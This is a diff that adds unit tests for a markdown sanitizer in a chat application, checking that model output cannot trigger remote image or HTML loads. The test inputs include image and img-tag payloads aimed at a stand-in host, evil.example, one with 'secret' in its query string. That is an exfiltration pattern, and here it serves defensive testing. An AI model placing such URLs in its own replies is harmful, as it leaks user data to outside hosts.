@@ -536,3 +536,74 @@ class TestScrubSecrets(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+@unittest.skipUnless(RUNNER, "No JavaScript runtime (node, qjs6, or qjs) available")
+class TestSanitizeMarkdown(unittest.TestCase):
+    """Model output must not make the chat load remote content by itself."""
+
+    def _sanitize(self, text: str) -> str:
+        with open(JS_PATH) as f:
+            src = _strip_qml_directives(f.read())
+        driver = "console.log(JSON.stringify(sanitizeMarkdown(%s)));" % _json(text)
+        with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as f:
+            f.write(src + "\n" + driver)
+            tmp = f.name
+        try:
+            r = subprocess.run([RUNNER, tmp], capture_output=True, text=True, timeout=10)
+            self.assertEqual(r.returncode, 0, msg=r.stderr)
+            import json
+            return json.loads(r.stdout)
+        finally:
+            os.unlink(tmp)
+
+    def test_inline_image_becomes_link(self):
+        out = self._sanitize("see ![a chart](https://evil.example/?q=secret) here")
+        self.assertNotIn("![", out)
+        self.assertIn("[a chart](https://evil.example/?q=secret)", out)
+
+    def test_image_with_title_and_empty_alt(self):
+        out = self._sanitize('![](https://evil.example/p.png "t")')
+        self.assertEqual(out, "[image](https://evil.example/p.png)")
+
+    def test_reference_image_becomes_link(self):
+        out = self._sanitize("![logo][1]\n\n[1]: https://evil.example/l.png")
+        self.assertNotIn("![", out)
+        self.assertIn("[logo][1]", out)
+
+    def test_raw_html_is_escaped(self):
+        out = self._sanitize('<img src="https://evil.example/x"> and <iframe src=x></iframe>')
+        self.assertNotIn("<img", out)
+        self.assertNotIn("<iframe", out)
+        self.assertNotIn("</iframe", out)
+
+    def test_html_comment_and_declaration_escaped(self):
+        out = self._sanitize("<!-- x --> <!DOCTYPE html> <?xml?>")
+        self.assertNotIn("<!", out)
+        self.assertNotIn("<?", out)
+
+    def test_autolink_kept_as_link(self):
+        out = self._sanitize("go to <https://kde.org> now")
+        self.assertIn("[https://kde.org](https://kde.org)", out)
+
+    def test_inline_code_untouched(self):
+        text = "use `<div>` and ``a ` b <img>`` please"
+        out = self._sanitize(text)
+        self.assertIn("`<div>`", out)
+        self.assertIn("``a ` b <img>``", out)
+
+    def test_unclosed_backtick_does_not_protect_html(self):
+        out = self._sanitize("a ` b <img src=x>")
+        self.assertNotIn("<img", out)
+
+    def test_comparison_operators_kept(self):
+        self.assertEqual(self._sanitize("1 < 2 and 3 > 2"), "1 < 2 and 3 > 2")
+
+    def test_plain_links_unchanged(self):
+        text = "[KDE](https://kde.org) **bold**"
+        self.assertEqual(self._sanitize(text), text)
+
+
+def _json(value: str) -> str:
+    import json
+    return json.dumps(value)
